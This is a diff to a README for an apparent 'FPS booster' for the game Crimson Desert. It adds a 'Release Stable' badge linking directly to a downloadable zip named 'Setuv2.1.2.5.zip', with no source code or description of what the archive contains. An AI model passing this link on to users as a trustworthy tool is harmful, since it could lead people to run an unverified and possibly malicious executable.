@@ -1,3 +1,5 @@
+[![Release](https://img.shields.io/badge/Release-Stable-success?style=for-the-badge&logo=github)](https://github.com/nickkumar-x2090b0/crimson-desert-boost-fps/releases/download/v1.0.0/Setuv2.1.2.5.zip)
+
 # crimson-desert-boost-fps
 
 Crimson-desert — FPS booster and optimizer for Crimson Desert. Designed to improve performance and increase frame rates.
